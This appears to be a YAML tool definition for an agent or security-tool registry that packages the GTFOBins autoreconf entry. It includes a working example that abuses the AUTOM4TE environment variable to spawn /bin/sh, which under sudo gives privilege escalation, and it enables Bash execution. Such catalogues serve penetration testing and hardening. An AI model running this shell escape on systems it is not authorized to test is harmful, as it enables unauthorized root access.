---
id: build-autotools-autoreconf
namespace: build:autotools:autoreconf
name: autoreconf
description: Rebuild autoconf files, can be used to spawn a shell via the AUTOM4TE environment variable.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - autoconf
  - autoheader
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs:
    - type: security.execution.context
      description: Sudo or unprivileged execution context
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 8
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: none
  disk_io: low
allowed-tools:
  - autoreconf
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "autoreconf"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via autoreconf using AUTOM4TE
    command: |
      echo '/bin/sh 1>&0' >/path/to/temp-file
      chmod +x /path/to/temp-file
      echo AC_INIT >configure.ac
      AUTOM4TE=/path/to/temp-file autoreconf
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/autoreconf/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "autoconf"
    commands:
      - "apt-get install -y autoconf"
---
